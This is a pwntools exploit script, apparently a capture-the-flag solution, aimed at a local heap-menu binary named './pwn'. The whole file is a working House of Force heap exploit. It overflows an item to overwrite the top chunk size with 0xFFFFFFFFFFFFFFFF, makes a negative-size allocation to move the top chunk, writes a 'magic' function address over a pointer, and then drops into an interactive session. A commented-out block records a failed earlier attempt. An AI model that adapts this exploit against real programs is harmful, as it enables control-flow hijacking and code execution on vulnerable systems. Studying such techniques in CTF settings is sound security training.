from pwn import *

if args['DEBUG']:
	context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc


def debug():
	gdb.attach(io)
	pause()

def cmd(index):
	io.sendlineafter(b'Your choice:', str(index).encode())

def add(size, name):
	cmd(2)
	io.sendlineafter(b'length of item name:', str(size).encode())
	io.sendafter(b'name of item:', name)

def show():
	cmd(1)

def change(index, size, name):
	cmd(3)
	io.sendlineafter(b'index of item:', str(index).encode())
	io.sendlineafter(b'length of item name:', str(size).encode())
	io.sendafter(b'name of the item:', name)

def delete(index):
	cmd(4)
	io.sendlineafter(b'index of item:', str(index).encode())

def exp():
	
	magic = 0x400D49
	"""
	add(0x10, b'A')
	payload = b'A'*0x10 + p64(0) + p64(0xFFFFFFFFFFFFFFFF)
	change(0, len(payload), payload)
	debug()
	add(-80, b'A')  # ==> 异常退出，但不知道啥错误
	"""
	add(0x40, b'A')
	payload = b'A'*0x40 + p64(0) + p64(0xFFFFFFFFFFFFFFFF)
	change(0, len(payload), payload)
	#debug()
	add(-128, b'A')
	
	#debug()
	add(0x10, p64(magic)*2)
	#debug()	
	io.sendline(b'5')
	io.interactive()

if __name__ == "__main__":
	exp()
